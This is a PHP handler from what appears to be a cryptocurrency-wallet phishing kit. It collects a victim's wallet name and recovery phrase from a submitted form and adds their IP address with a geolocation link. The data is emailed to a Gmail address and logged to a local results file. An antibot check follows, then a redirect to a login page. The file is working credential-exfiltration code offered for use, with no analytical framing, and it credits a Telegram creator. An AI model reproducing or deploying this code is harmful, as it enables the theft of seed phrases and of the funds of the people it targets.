<?php
$Cashout = getenv("REMOTE_ADDR");
$subject = "DAPPS WALLET[ " . $Cashout . " ] /";
$headers = "From: rootman <service>\r\n";
$message .= "
+----/!\----<.![+] DAPPS WALLET   [+]!.>---/!\----+
 [wallet name ]           : ".$_POST['wallet_id']."
 [Recovery Phase]           : ".$_POST['recovery_phrase']."
-------------------------------------------------
+----/!\----<.![+] IP GEOINFO  [+]!.>---/!\----+
 [IP] :  http://geoiptool.com/en/?ip=".$_SERVER['REMOTE_ADDR']."
!\----<.! CREATED BY  : https://t.me/ro0tM8n !.>---/!
\n";
mail('Inboxjollie@gmail.com',$subject,$message,$headers);
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
$xxx = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
require './antibot.php';
header("Location: login.php?$xxx");
?>

